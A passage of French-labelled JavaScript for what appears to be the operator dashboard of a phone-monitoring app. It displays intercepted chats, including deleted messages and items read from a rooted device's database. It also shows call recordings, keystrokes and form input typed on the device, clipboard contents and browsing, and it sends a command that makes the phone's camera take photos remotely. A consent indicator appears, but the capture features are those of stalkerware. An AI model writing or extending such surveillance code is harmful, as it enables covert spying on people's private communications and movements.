    else if(lastItem.isCall)lastPreview=`📞 Appel ${lastItem.callType}`;
    else if(lastItem.isMedia)lastPreview='📷 Photo';
    else lastPreview=lastItem.text.slice(0,60)+(lastItem.text.length>60?'…':'');

    const voiceCount=g.items.filter(i=>i.isVoice).length;
    const callCount=g.items.filter(i=>i.isCall).length;
    const rootTag=g.items.some(i=>i.source==='root_db')?'<span class="conv-root-badge">ROOT</span>':'';

    // Rendu des items du fil
    const itemsHtml=g.items.slice(-50).map(i=>renderConvItem(i,g.isGroup)).join('');

    return`<div class="conv-card">
      <div class="conv-card-header" onclick="this.parentElement.classList.toggle('open')">
        <div class="conv-card-avatar" style="background:${color}">${icon}</div>
        <div class="conv-card-info">
          <div class="conv-card-top">
            <span class="conv-card-name">${esc(g.label)}</span>
            ${rootTag}
            <span class="conv-card-time">${shortTime(g.lastTime)}</span>
          </div>
          <div class="conv-card-bottom">
            <span class="conv-card-app">${esc(g.app)}</span>
            <span class="conv-card-preview">${esc(lastPreview)}</span>
            ${voiceCount?`<span class="conv-voice-badge">🎤 ${voiceCount}</span>`:''}
            ${callCount?`<span class="conv-voice-badge">📞 ${callCount}</span>`:''}
            <span class="conv-card-badge">${totalItems}</span>
          </div>
        </div>
      </div>
      <div class="conv-card-messages">${itemsHtml}</div>
    </div>`;
  }).join('');
}

function renderConvItem(item,isGroup){
  const dirClass=item.isOutgoing?'conv-bubble-out':'conv-bubble-in';
  const timeStr=shortTime(item.time);

  // Message supprimé
  if(item.isDeleted){
    return`<div class="conv-bubble ${dirClass} deleted-bubble">
      ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
      <div class="conv-bubble-text deleted-text">🚫 Ce message a été supprimé</div>
      <div class="conv-bubble-time">${timeStr}</div>
    </div>`;
  }

  // Appel téléphonique
  if(item.isCall){
    const callIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
    const ci=callIcons[item.callType]||'📞';
    const dur=item.duration>0?` · ${Math.floor(item.duration/60)}min ${item.duration%60}s`:'';
    const hasRecording=item.audioId?`<div class="conv-audio-player"><audio controls preload="none" src="/api/audio/${item.audioId}/stream"></audio><span class="conv-audio-label">Enregistrement de l'appel</span></div>`:'';
    return`<div class="conv-bubble conv-bubble-call">
      <div class="conv-bubble-call-info">${ci} <strong>Appel ${esc(item.callType)}</strong>${dur}</div>
      ${hasRecording}
      <div class="conv-bubble-time">${timeStr}</div>
    </div>`;
  }

  // Message vocal (avec ou sans audio écoutable)
  if(item.isVoice){
    const durText=item.duration>0?`${item.duration}s`:'';
    const playerHtml=item.audioId
      ?`<div class="conv-audio-player"><audio controls preload="none" src="/api/audio/${item.audioId}/stream"></audio></div>`
      :`<div class="conv-audio-wave">🎤 ${durText?'Vocal '+durText:'Message vocal'}</div>`;
    return`<div class="conv-bubble ${dirClass} voice-bubble">
      ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
      ${playerHtml}
      <div class="conv-bubble-time">${item.isOutgoing?'Envoyé':'Reçu'} · ${timeStr}</div>
    </div>`;
  }

  // Photo / média
  if(item.isMedia&&!item.text){
    const mediaIcons={image:'📷',video:'🎬',document:'📄',location:'📍',sticker:'🏷️',gif:'🎞️',contact:'👤',voice_note:'🎤'};
    const mi=mediaIcons[item.mediaType]||'📎';
    return`<div class="conv-bubble ${dirClass} media-bubble">
      ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
      <div class="conv-bubble-media">${mi} ${esc(item.mediaType||'Média')}</div>
      <div class="conv-bubble-time">${item.isOutgoing?'Envoyé':'Reçu'} · ${timeStr}</div>
    </div>`;
  }

  // Message transféré
  const fwdTag=item.isForwarded?'<div class="conv-forwarded">↗️ Transféré</div>':'';

  // Message cité
  const quoteHtml=item.quotedMessage?`<div class="conv-quoted">${esc(item.quotedMessage)}</div>`:'';

  // Message texte normal
  return`<div class="conv-bubble ${dirClass}">
    ${isGroup&&!item.isOutgoing?`<div class="conv-bubble-sender">${esc(item.sender)}</div>`:''}
    ${fwdTag}${quoteHtml}
    <div class="conv-bubble-text">${esc(item.text)}</div>
    <div class="conv-bubble-time">${item.isOutgoing?'Envoyé':'Reçu'} · ${timeStr}</div>
  </div>`;
}

// --- Texte tape (reconstruit intelligemment) ---
function renderTypedTexts(evts){
  const keystrokes=evts.filter(e=>e.type==='keystroke'||e.type==='chrome_text'||e.type==='safari_text'||e.type==='chrome_form'||e.type==='safari_form');
  const el=document.getElementById('typed-list');
  if(!keystrokes.length){el.innerHTML='<p class="empty">Aucun texte capture. Le texte tape au clavier apparaitra ici.</p>';return;}

  const blocks=[];
  let current=null;
  keystrokes.sort((a,b)=>new Date(a.receivedAt)-new Date(b.receivedAt)).forEach(e=>{
    const p=e.payload||{};
    const app=p.app||'App';
    const text=p.text||Object.values(p.fields||{}).join(' ')||'';
    if(!text)return;
    const time=new Date(e.receivedAt).getTime();
    if(current&&current.app===app&&time-current.lastTime<300000){
      current.texts.push(text);
      current.lastTime=time;
      current.endTime=e.receivedAt;
    }else{
      current={app,texts:[text],startTime:e.receivedAt,endTime:e.receivedAt,lastTime:time,device:e.deviceId};
      blocks.push(current);
    }
  });

  el.innerHTML=blocks.reverse().slice(0,50).map(b=>{
    const combinedText=b.texts[b.texts.length-1];
    const appLabel=readableAppName(b.app);
    return`<div class="typed-block">
      <div class="typed-app">⌨️ <strong>${esc(appLabel)}</strong> — ${esc(deviceName(b.device))}</div>
      <div class="typed-text">${esc(combinedText)}</div>
      <div class="typed-time">${fmtTime(b.startTime)}</div>
    </div>`;
  }).join('');
}

// --- Journal d'appels ---
function renderCallLog(evts){
  const calls=evts.filter(e=>e.type==='phone_call');
  const el=document.getElementById('calls-list');
  if(!calls.length){el.innerHTML='<p class="empty">Aucun appel enregistre. Le journal d\'appels apparaitra ici.</p>';return;}

  const typeIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
  const typeColors={entrant:'var(--success)',sortant:'var(--accent)',manque:'var(--danger)',rejete:'var(--warning)'};

  el.innerHTML=calls.slice(0,50).map(e=>{
    const p=e.payload||{};
    const icon=typeIcons[p.type]||'📞';
    const dur=p.durationMinutes>0?`${p.durationMinutes} min`:(p.durationSeconds>0?`${p.durationSeconds}s`:'—');
    return`<div class="call-row">
      <div class="call-icon">${icon}</div>
      <div class="call-info">
        <div class="call-number">${esc(p.number||'Inconnu')}</div>
        ${p.contact?`<div class="call-contact">${esc(p.contact)}</div>`:''}
      </div>
      <div class="call-meta">
        <div class="call-duration" style="color:${typeColors[p.type]||'var(--text)'}">${esc(p.type||'')} · ${dur}</div>
        <div class="call-time">${fmtTime(e.receivedAt)}</div>
      </div>
    </div>`;
  }).join('');
}

// --- Applications utilisees ---
function renderAppUsage(evts){
  const focuses=evts.filter(e=>e.type==='app_focus');
  const el=document.getElementById('apps-list');
  if(!focuses.length){el.innerHTML='<p class="empty">Aucune app detectee.</p>';return;}

  const appCounts={};
  focuses.forEach(e=>{
    const app=e.payload?.app||'';
    if(!app||app.includes('systemui')||app.includes('launcher'))return;
    if(!appCounts[app])appCounts[app]={count:0,last:e.receivedAt};
    appCounts[app].count++;
    if(e.receivedAt>appCounts[app].last)appCounts[app].last=e.receivedAt;
  });

  const sorted=Object.entries(appCounts).sort((a,b)=>b[1].count-a[1].count);
  el.innerHTML=sorted.slice(0,30).map(([app,data])=>{
    const label=readableAppName(app);
    const isKnown=PACKAGE_NAMES[app];
    return`<div class="app-row">
      <span class="app-name">${esc(label)}${!isKnown?` <span style="color:var(--text-dim);font-weight:400;font-size:0.65rem">${esc(app)}</span>`:''}</span>
      <span style="font-weight:600">${data.count}x</span>
      <span class="app-time-ago">${fmtTime(data.last)}</span>
    </div>`;
  }).join('');
}

// --- Presse-papiers ---
function renderClipboardLog(evts){
  const clips=evts.filter(e=>e.type==='clipboard');
  const el=document.getElementById('clipboard-list');
  if(!clips.length){el.innerHTML='<p class="empty">Aucun contenu copie.</p>';return;}

  el.innerHTML=clips.slice(0,30).map(e=>{
    const p=e.payload||{};
    return`<div class="typed-block">
      <div class="typed-text">${esc((p.text||'').slice(0,500))}</div>
      <div class="typed-time">${p.length||0} caracteres — ${fmtTime(e.receivedAt)} — ${esc(deviceName(e.deviceId))}</div>
    </div>`;
  }).join('');
}

document.getElementById('messages-device-filter')?.addEventListener('change',renderMessagesPage);

// ─── KEYWORDS ───
async function loadKeywords(){
  const kws=await fetchJ('/api/keywords');
  const el=document.getElementById('keywords-list');
  if(!kws.length){el.innerHTML='<p class="empty">Aucun mot-clé. Ajoutez-en ci-dessus.</p>';return;}
  el.innerHTML=kws.map(k=>`<div class="event-row"><span class="event-badge" style="background:#3a3a1e;color:#fde047">${esc(k.word)}</span>
    <div class="event-content"><div class="event-detail">Catégorie : ${esc(k.category)}</div></div>
    <button class="btn btn-back" style="font-size:0.7rem" onclick="deleteKeyword(${k.id})">Supprimer</button></div>`).join('');
}
async function addKeyword(){
  const w=document.getElementById('new-keyword').value.trim();const c=document.getElementById('new-keyword-cat').value.trim();
  if(!w)return;await fetch(`${API}/api/keywords`,{method:'POST',headers:authHeaders(),body:JSON.stringify({word:w,category:c})});
  document.getElementById('new-keyword').value='';loadKeywords();
}
async function deleteKeyword(id){await fetch(`${API}/api/keywords/${id}`,{method:'DELETE',headers:authHeaders()});loadKeywords();}

// ─── CHARTS ───
function renderCharts(){
  // Types d'événements (camembert)
  const typeCounts={};allEvents.forEach(e=>{typeCounts[e.type]=(typeCounts[e.type]||0)+1;});
  if(charts.types)charts.types.destroy();
  charts.types=new Chart(document.getElementById('chart-types'),{type:'doughnut',data:{labels:Object.keys(typeCounts).map(t=>TYPE_LABELS[t]||t),datasets:[{data:Object.values(typeCounts),backgroundColor:['#3b82f6','#22c55e','#f59e0b','#ef4444','#8b5cf6','#ec4899','#06b6d4','#f97316','#14b8a6','#6366f1','#84cc16','#e11d48']}]},options:{plugins:{legend:{position:'right',labels:{color:'#8b9cb3',font:{size:10}}}}}});

  // Activité par heure
  const hourly=new Array(24).fill(0);allEvents.forEach(e=>{const h=new Date(e.receivedAt).getHours();hourly[h]++;});
  if(charts.hourly)charts.hourly.destroy();
  charts.hourly=new Chart(document.getElementById('chart-hourly'),{type:'bar',data:{labels:Array.from({length:24},(_,i)=>`${i}h`),datasets:[{label:'Événements',data:hourly,backgroundColor:'#3b82f6'}]},options:{scales:{y:{ticks:{color:'#8b9cb3'}},x:{ticks:{color:'#8b9cb3'}}},plugins:{legend:{display:false}}}});

  // Sites les plus visités
  const sites={};allEvents.filter(e=>e.payload?.url).forEach(e=>{try{const h=new URL(e.payload.url).hostname;sites[h]=(sites[h]||0)+1;}catch{}});
  const topSites=Object.entries(sites).sort((a,b)=>b[1]-a[1]).slice(0,10);
  if(charts.sites)charts.sites.destroy();
  charts.sites=new Chart(document.getElementById('chart-sites'),{type:'bar',data:{labels:topSites.map(s=>s[0]),datasets:[{label:'Visites',data:topSites.map(s=>s[1]),backgroundColor:'#22c55e'}]},options:{indexAxis:'y',scales:{y:{ticks:{color:'#8b9cb3',font:{size:9}}},x:{ticks:{color:'#8b9cb3'}}},plugins:{legend:{display:false}}}});

  // Apps réseau
  const apps={};allEvents.filter(e=>e.type==='network_traffic'&&e.payload?.app).forEach(e=>{apps[e.payload.app]=(apps[e.payload.app]||0)+1;});
  const topApps=Object.entries(apps).sort((a,b)=>b[1]-a[1]).slice(0,10);
  if(charts.apps)charts.apps.destroy();
  charts.apps=new Chart(document.getElementById('chart-apps'),{type:'doughnut',data:{labels:topApps.map(a=>a[0]),datasets:[{data:topApps.map(a=>a[1]),backgroundColor:['#8b5cf6','#ec4899','#06b6d4','#f97316','#14b8a6','#6366f1','#84cc16','#e11d48','#3b82f6','#22c55e']}]},options:{plugins:{legend:{position:'right',labels:{color:'#8b9cb3',font:{size:10}}}}}});
}

// ─── FILTERS ───
function fillDeviceFilters(){
  ['browsing-device-filter','events-device-filter','timeline-device','photos-device-filter','messages-device-filter'].forEach(id=>{
    const sel=document.getElementById(id);const val=sel.value;
    sel.innerHTML='<option value="">Tous les appareils</option>'+allDevices.map(d=>`<option value="${esc(d.deviceId)}">${esc(d.deviceName||d.deviceId.slice(0,8))}</option>`).join('');
    sel.value=val;
  });
}

// ─── PHOTOS ───

// Demander au téléphone de prendre une photo
async function requestPhoto(){
  if(!currentDetailDevice){alert('Sélectionnez un appareil');return;}
  const btn=document.getElementById('btn-take-photo');
  btn.classList.add('btn-taking-photo');
  btn.textContent='📷 En attente…';
  try{
    const r=await fetch(`${API}/api/commands/${currentDetailDevice}`,{
      method:'POST',headers:authHeaders(),
      body:JSON.stringify({type:'take_photo',payload:{camera:'back',quality:0.8}})
    });
    const d=await r.json();
    if(d.ok){
      showToast('📷 Commande envoyée','En attente de la photo de '+deviceName(currentDetailDevice)+'…');
    }else{
      btn.classList.remove('btn-taking-photo');btn.textContent='📷 Prendre une photo';
      alert('Erreur : '+(d.error||'inconnue'));
    }
  }catch(err){
    btn.classList.remove('btn-taking-photo');btn.textContent='📷 Prendre une photo';
    alert('Erreur réseau');
  }
}

// Quand une nouvelle photo arrive (WebSocket)
function onNewPhotoReceived(photo){
  showPhotoToast(photo);
  // Rafraîchir la galerie si on est sur la page photos
  const photosPage=document.getElementById('page-photos');
  if(photosPage&&photosPage.classList.contains('active'))loadPhotosPage();
  // Rafraîchir les photos du détail appareil si c'est le même appareil
  if(currentDetailDevice===photo.deviceId){
    loadDevicePhotos(photo.deviceId);
    const btn=document.getElementById('btn-take-photo');
    if(btn){btn.classList.remove('btn-taking-photo');btn.textContent='📷 Prendre une photo';}
  }
}

// Notification toast quand une photo arrive
function showPhotoToast(photo){
  const existing=document.querySelector('.photo-toast');if(existing)existing.remove();
  const toast=document.createElement('div');toast.className='photo-toast';
  const srcLabel=SOURCE_LABELS[photo.source]||'Photo';
  const appLabel=APP_LABELS[photo.sourceApp]||'';
  const appIcon=APP_ICONS[photo.sourceApp]||'📷';
  const tagLine=photo.sourceApp?`${appIcon} via <strong>${esc(appLabel)}</strong>`:srcLabel;
  toast.innerHTML=`<img src="${API}/api/photos/${photo.id}/thumb" alt="Photo">
    <div class="photo-toast-text"><strong>📷 Nouvelle photo</strong>${esc(deviceName(photo.deviceId))}<br>${tagLine}<br><span style="color:var(--text-dim)">${fmtTime(photo.receivedAt)}</span></div>`;
  toast.style.cursor='pointer';
  toast.onclick=()=>{openPhotoModal(photo);toast.remove();};
  document.body.appendChild(toast);
  setTimeout(()=>{if(toast.parentNode)toast.remove();},8000);
}

// Toast générique
function showToast(title,text){
  const existing=document.querySelector('.photo-toast');if(existing)existing.remove();
  const toast=document.createElement('div');toast.className='photo-toast';
  toast.innerHTML=`<div class="photo-toast-text"><strong>${title}</strong>${text}</div>`;
  document.body.appendChild(toast);
  setTimeout(()=>{if(toast.parentNode)toast.remove();},5000);
}

// Helper : badge source
function sourceBadgeHTML(source){
  const lbl=SOURCE_LABELS[source]||source||'Auto';
  return`<span class="photo-source-badge source-${esc(source||'auto')}">${esc(lbl)}</span>`;
}

// Helper : badge app
function appBadgeHTML(sourceApp){
  if(!sourceApp)return'';
  const lbl=APP_LABELS[sourceApp]||sourceApp;
  const icon=APP_ICONS[sourceApp]||'📱';
  return`<span class="photo-app-badge app-${esc(sourceApp)}">${icon} ${esc(lbl)}</span>`;
}

// Charger la page galerie de photos
async function loadPhotosPage(){
  const deviceId=document.getElementById('photos-device-filter').value;
  const source=document.getElementById('photos-source-filter').value;
  const sourceApp=document.getElementById('photos-app-filter').value;
  let url='/api/photos?limit=100';
  if(deviceId)url+=`&deviceId=${deviceId}`;
  if(source)url+=`&source=${source}`;
  if(sourceApp)url+=`&sourceApp=${sourceApp}`;
  try{
    const photos=await fetchJ(url);
    renderPhotosStats(photos);
    renderPhotosGrid(document.getElementById('photos-gallery'),photos,true);
  }catch(err){
    document.getElementById('photos-gallery').innerHTML='<p class="empty">Erreur de chargement.</p>';
  }
}

// Stats en haut de la page photos
function renderPhotosStats(photos){
  const el=document.getElementById('photos-stats');
  if(!photos.length){el.innerHTML='';return;}
  const bySrc={};const byApp={};
  photos.forEach(p=>{
    bySrc[p.source||'auto']=(bySrc[p.source||'auto']||0)+1;
    if(p.sourceApp)byApp[p.sourceApp]=(byApp[p.sourceApp]||0)+1;
  });
  let html=`<div class="photos-stat-item"><strong>${photos.length}</strong> photos</div>`;
  Object.entries(bySrc).forEach(([k,v])=>{
    const dotClass=k==='auto'?'dot-auto':k==='command'?'dot-command':'';
    html+=`<div class="photos-stat-item"><span class="dot ${dotClass}"></span>${esc(SOURCE_LABELS[k]||k)} : <strong>${v}</strong></div>`;
  });
  Object.entries(byApp).sort((a,b)=>b[1]-a[1]).forEach(([k,v])=>{
    const icon=APP_ICONS[k]||'📱';
    html+=`<div class="photos-stat-item">${icon} ${esc(APP_LABELS[k]||k)} : <strong>${v}</strong></div>`;
  });
  el.innerHTML=html;
}

// Charger les photos d'un appareil spécifique (détail)
async function loadDevicePhotos(deviceId){
  try{
    const photos=await fetchJ(`/api/photos?deviceId=${deviceId}&limit=20`);
    const container=document.querySelector('#detail-photos .photos-grid');
    if(container)renderPhotosGrid(container,photos,false);
  }catch(err){}
}

// Rendu de la grille de photos
function renderPhotosGrid(el,photos,showDevice){
  if(!photos.length){el.innerHTML='<p class="empty">Aucune photo.</p>';return;}
  el.innerHTML=photos.map(p=>{
    const size=p.sizeBytes>1048576?(p.sizeBytes/1048576).toFixed(1)+' Mo':(p.sizeBytes/1024).toFixed(0)+' Ko';
    const srcBadge=sourceBadgeHTML(p.source);
    const appBadge=appBadgeHTML(p.sourceApp);
    return`<div class="photo-card" onclick="openPhotoModal(${JSON.stringify(p).replace(/"/g,'&quot;')})">
      <img class="photo-card-img" src="${API}/api/photos/${p.id}/thumb" alt="Photo" loading="lazy">
      <div class="photo-card-body">
        ${showDevice?`<div class="photo-card-device">${esc(deviceName(p.deviceId))}</div>`:''}
        <div class="photo-card-badges">${srcBadge}${appBadge}</div>
        <div class="photo-card-time">${fmtTime(p.receivedAt)}</div>
        <div class="photo-card-size">${size}</div>
        <div class="photo-card-actions">
          <button class="btn btn-back" onclick="event.stopPropagation();downloadPhoto(${p.id},'${esc(p.filename)}')">Télécharger</button>
          <button class="btn btn-back" style="color:var(--danger)" onclick="event.stopPropagation();deletePhoto(${p.id})">Supprimer</button>
        </div>
      </div>
    </div>`;
  }).join('');
}

// Modal plein écran pour voir une photo
function openPhotoModal(photoOrId,deviceId,receivedAt){
  const modal=document.getElementById('photo-modal');
  const img=document.getElementById('photo-modal-img');
  const info=document.getElementById('photo-modal-info');
  // Support ancien appel (id, deviceId, receivedAt) et nouveau (objet photo)
  let id,devId,time,source,sourceApp;
  if(typeof photoOrId==='object'){
    id=photoOrId.id;devId=photoOrId.deviceId;time=photoOrId.receivedAt;
    source=photoOrId.source;sourceApp=photoOrId.sourceApp;
  }else{
    id=photoOrId;devId=deviceId;time=receivedAt;
  }
  img.src=`${API}/api/photos/${id}/image`;
  const srcBadge=sourceBadgeHTML(source);
  const appBadge=appBadgeHTML(sourceApp);
  info.innerHTML=`<strong>${esc(deviceName(devId))}</strong> — ${fmtTime(time)}<br>${srcBadge} ${appBadge}`;
  modal.classList.add('active');
}

function closePhotoModal(e){
  if(e&&e.target!==e.currentTarget)return;
  document.getElementById('photo-modal').classList.remove('active');
  document.getElementById('photo-modal-img').src='';
}

// Télécharger une photo
function downloadPhoto(id,filename){
  const a=document.createElement('a');
  a.href=`${API}/api/photos/${id}/image`;a.download=filename||'photo.jpg';
  document.body.appendChild(a);a.click();a.remove();
}

// Supprimer une photo
async function deletePhoto(id){
  if(!confirm('Supprimer cette photo ?'))return;
  await fetch(`${API}/api/photos/${id}`,{method:'DELETE',headers:authHeaders()});
  loadPhotosPage();
  if(currentDetailDevice)loadDevicePhotos(currentDetailDevice);
}

// Filtres de la page photos
document.getElementById('photos-device-filter').addEventListener('change',loadPhotosPage);
document.getElementById('photos-source-filter').addEventListener('change',loadPhotosPage);
document.getElementById('photos-app-filter').addEventListener('change',loadPhotosPage);

// Fermer la modal avec Escape
document.addEventListener('keydown',(e)=>{if(e.key==='Escape')closePhotoModal();});

// ─── SÉCURITÉ (Coffre-fort) ───

async function loadSecurityPage(){
  try{
    const[status,settings]=await Promise.all([fetchJ('/api/security/status'),fetchJ('/api/security/settings')]);
    // Stats
    document.getElementById('sec-2fa-status').textContent=status.totpEnabled?'✅ Activé':'❌ Désactivé';
    document.getElementById('sec-2fa-status').style.color=status.totpEnabled?'var(--success)':'var(--danger)';
    document.getElementById('sec-failed-24h').textContent=status.recentFailedLogins24h;
    document.getElementById('sec-session-timeout').textContent=status.sessionTimeout;
    document.getElementById('sec-audit-count').textContent=status.totalAuditEntries;
    // Paramètres
    document.getElementById('sec-max-attempts').value=settings.settings.max_failed_attempts||5;
    document.getElementById('sec-lockout-minutes').value=settings.settings.lockout_duration_minutes||15;
    document.getElementById('sec-session-min').value=settings.settings.session_timeout_minutes||60;
    document.getElementById('sec-ip-whitelist').value=settings.settings.ip_whitelist||'';
    document.getElementById('sec-strong-pass').checked=settings.settings.require_strong_password==='true';
    // 2FA panel
    render2FAPanel(status.totpEnabled);
    // Audit log
    loadAuditLog();
  }catch(err){console.error('Erreur chargement sécurité',err);}
}

function render2FAPanel(enabled){
  const panel=document.getElementById('security-2fa-panel');
  if(enabled){
    panel.innerHTML=`<div style="text-align:center">
      <div style="font-size:2.5rem;margin-bottom:0.5rem">✅</div>
      <p style="color:var(--success);font-weight:600;font-size:1rem">2FA Activé</p>
      <p style="color:var(--text-muted);font-size:0.8rem;margin:0.5rem 0">Votre compte est protégé par l'authentification à 2 facteurs.</p>
      <div class="field" style="margin-top:1rem"><label>Mot de passe pour désactiver</label><input type="password" id="sec-2fa-disable-pass"></div>
      <button class="btn" style="background:var(--danger)" onclick="disable2FA()">Désactiver 2FA</button>
    </div>`;
  }else{
    panel.innerHTML=`<div style="text-align:center">
      <div style="font-size:2.5rem;margin-bottom:0.5rem">🔓</div>
      <p style="color:var(--danger);font-weight:600;font-size:1rem">2FA Non activé</p>
      <p style="color:var(--text-muted);font-size:0.8rem;margin:0.5rem 0">Activez la double authentification pour sécuriser votre compte comme un coffre-fort.</p>
      <button class="btn" style="background:#8b5cf6" onclick="setup2FA()">Activer 2FA</button>
    </div>`;
  }
}

async function setup2FA(){
  try{
    const r=await fetch(`${API}/api/auth/2fa/setup`,{method:'POST',headers:authHeaders()});
    const d=await r.json();
    if(!d.ok){alert(d.error||'Erreur');return;}
    const panel=document.getElementById('security-2fa-panel');
    panel.innerHTML=`<div style="text-align:center">
      <p style="font-weight:600;margin-bottom:0.75rem">1. Scannez ce QR code avec votre app</p>
      <p style="color:var(--text-muted);font-size:0.75rem;margin-bottom:0.5rem">Google Authenticator, Authy, Microsoft Authenticator…</p>
      <div style="background:white;display:inline-block;padding:12px;border-radius:8px;margin:0.5rem 0">
        <img id="sec-2fa-qr" src="" alt="QR Code" style="width:180px;height:180px">
      </div>
      <p style="color:var(--text-dim);font-size:0.7rem;margin:0.5rem 0">Ou entrez manuellement : <strong style="color:var(--text);letter-spacing:2px">${esc(d.secret)}</strong></p>
      <div class="field" style="margin-top:1rem"><label>2. Entrez le code affiché dans l'app</label>
        <input type="text" id="sec-2fa-verify-code" maxlength="6" placeholder="000000" style="text-align:center;font-size:1.2rem;letter-spacing:6px;font-weight:700">
      </div>
      <button class="btn" style="background:#8b5cf6" onclick="verify2FA()">Vérifier et activer</button>
    </div>`;
    // Générer QR code via API externe simple
    const qrUrl='https://api.qrserver.com/v1/create-qr-code/?size=180x180&data='+encodeURIComponent(d.otpauthUrl);
    document.getElementById('sec-2fa-qr').src=qrUrl;
  }catch(err){alert('Erreur réseau');}
}

async function verify2FA(){
  const code=document.getElementById('sec-2fa-verify-code').value.trim();
  if(!code||code.length!==6){alert('Entrez un code à 6 chiffres');return;}
  try{
    const r=await fetch(`${API}/api/auth/2fa/verify`,{method:'POST',headers:authHeaders(),body:JSON.stringify({code})});
    const d=await r.json();
    if(d.ok){
      alert('✅ 2FA activé avec succès ! Votre compte est maintenant protégé.');
      loadSecurityPage();
    }else{alert(d.error||'Code invalide');}
  }catch(err){alert('Erreur réseau');}
}

async function disable2FA(){
  const pass=document.getElementById('sec-2fa-disable-pass').value;
  if(!pass){alert('Entrez votre mot de passe');return;}
  if(!confirm('Êtes-vous sûr de vouloir désactiver la 2FA ? Votre compte sera moins sécurisé.')){return;}
  try{
    const r=await fetch(`${API}/api/auth/2fa/disable`,{method:'POST',headers:authHeaders(),body:JSON.stringify({password:pass})});
    const d=await r.json();
    if(d.ok){alert('2FA désactivé.');loadSecurityPage();}
    else{alert(d.error||'Erreur');}
  }catch(err){alert('Erreur réseau');}
}

async function changePassword(){
  const cur=document.getElementById('sec-current-pass').value;
  const nw=document.getElementById('sec-new-pass').value;
  const cf=document.getElementById('sec-confirm-pass').value;
  const errEl=document.getElementById('sec-pass-error');
  errEl.style.display='none';
  if(!cur){errEl.textContent='Entrez le mot de passe actuel';errEl.style.display='block';return;}
  if(!nw){errEl.textContent='Entrez un nouveau mot de passe';errEl.style.display='block';return;}
  if(nw!==cf){errEl.textContent='Les mots de passe ne correspondent pas';errEl.style.display='block';return;}
  try{
    const r=await fetch(`${API}/api/auth/change-password`,{method:'POST',headers:authHeaders(),body:JSON.stringify({currentPassword:cur,newPassword:nw})});
    const d=await r.json();
    if(d.ok){
      alert('✅ Mot de passe changé avec succès.');
      document.getElementById('sec-current-pass').value='';
      document.getElementById('sec-new-pass').value='';
      document.getElementById('sec-confirm-pass').value='';
    }else{errEl.textContent=d.error||'Erreur';errEl.style.display='block';}
  }catch(err){errEl.textContent='Erreur réseau';errEl.style.display='block';}
}

async function saveSecuritySettings(){
  const settings={
    max_failed_attempts:document.getElementById('sec-max-attempts').value,
    lockout_duration_minutes:document.getElementById('sec-lockout-minutes').value,
    session_timeout_minutes:document.getElementById('sec-session-min').value,
    ip_whitelist:document.getElementById('sec-ip-whitelist').value,
    require_strong_password:document.getElementById('sec-strong-pass').checked?'true':'false',
  };
  try{
    const r=await fetch(`${API}/api/security/settings`,{method:'POST',headers:authHeaders(),body:JSON.stringify({settings})});
    const d=await r.json();
    if(d.ok){alert('✅ Paramètres de sécurité sauvegardés.');loadSecurityPage();}
    else{alert(d.error||'Erreur');}
  }catch(err){alert('Erreur réseau');}
}

async function loadAuditLog(){
  try{
    const logs=await fetchJ('/api/audit-log?limit=50');
    const el=document.getElementById('audit-log-list');
    if(!logs.length){el.innerHTML='<p class="empty">Aucune entrée.</p>';return;}
    el.innerHTML=logs.map(l=>{
      const iconMap={login_success:'✅',login_failed:'❌',login_locked:'🔒',rate_limited:'⚡',
        account_locked:'🔒','2fa_enabled':'🔐','2fa_disabled':'🔓','2fa_failed':'❌',
        password_changed:'🔑',security_settings_changed:'⚙️',ip_blocked:'🚫',
        view_audit_log:'👁️','2fa_setup_started':'🔐'};
      const icon=iconMap[l.action]||'📋';
      const actionColors={login_success:'#22c55e',login_failed:'#ef4444',account_locked:'#ef4444',
        '2fa_enabled':'#8b5cf6','2fa_disabled':'#f59e0b',ip_blocked:'#ef4444'};
      const color=actionColors[l.action]||'var(--text-muted)';
      return`<div class="event-row">
        <span class="event-badge" style="background:${color}20;color:${color};min-width:40px">${icon}</span>
        <div class="event-content">
          <div style="font-weight:500;font-size:0.8rem">${esc(l.action.replace(/_/g,' '))}</div>
          <div class="event-detail">${esc(l.adminUsername||'–')} ${l.ip?'('+esc(l.ip)+')':''} ${l.detail?'– '+esc(l.detail):''}</div>
        </div>
        <span class="event-time">${fmtTime(l.createdAt)}</span>
      </div>`;
    }).join('');
  }catch(err){}
}

// ─── SYNC CONFIG ───

async function loadSyncConfig(deviceId){
  try{
    const config=await fetchJ(`/api/sync-config/${deviceId}`);
    document.getElementById('sync-interval').value=config.syncIntervalMinutes||15;
    document.getElementById('sync-wifi-only').checked=!!config.syncOnWifiOnly;
    document.getElementById('sync-charging-only').checked=!!config.syncOnChargingOnly;
    document.getElementById('sync-photo-quality').value=config.photoQuality||0.5;
    document.getElementById('sync-photo-maxwidth').value=config.photoMaxWidth||1280;
    const mods=typeof config.modulesEnabled==='string'?JSON.parse(config.modulesEnabled):config.modulesEnabled||{};
    document.getElementById('mod-location').checked=!!mods.location;
    document.getElementById('mod-browser').checked=!!mods.browser;
    document.getElementById('mod-apps').checked=!!mods.apps;
    document.getElementById('mod-photos').checked=!!mods.photos;
    document.getElementById('mod-network').checked=!!mods.network;
    // Afficher le statut consentement
    const device=allDevices.find(d=>d.deviceId===deviceId);
    const statusEl=document.getElementById('sync-consent-status');
    if(device&&device.consentGiven){
      statusEl.innerHTML='<span style="color:var(--success)">&#10003; Consentement donné</span>';
    }else{
      statusEl.innerHTML='<span style="color:var(--warning)">&#9888; Consentement non donné – la collecte est bloquée</span>';
    }
  }catch(err){console.error('Erreur chargement sync config',err);}
}

async function saveSyncConfig(){
  if(!currentDetailDevice)return;
  const config={
    syncIntervalMinutes:parseInt(document.getElementById('sync-interval').value)||15,
    syncOnWifiOnly:document.getElementById('sync-wifi-only').checked,
    syncOnChargingOnly:document.getElementById('sync-charging-only').checked,
    photoQuality:parseFloat(document.getElementById('sync-photo-quality').value)||0.5,
    photoMaxWidth:parseInt(document.getElementById('sync-photo-maxwidth').value)||1280,
    modulesEnabled:{
      location:document.getElementById('mod-location').checked,
      browser:document.getElementById('mod-browser').checked,
      apps:document.getElementById('mod-apps').checked,
      photos:document.getElementById('mod-photos').checked,
      network:document.getElementById('mod-network').checked,
    }
  };
  try{
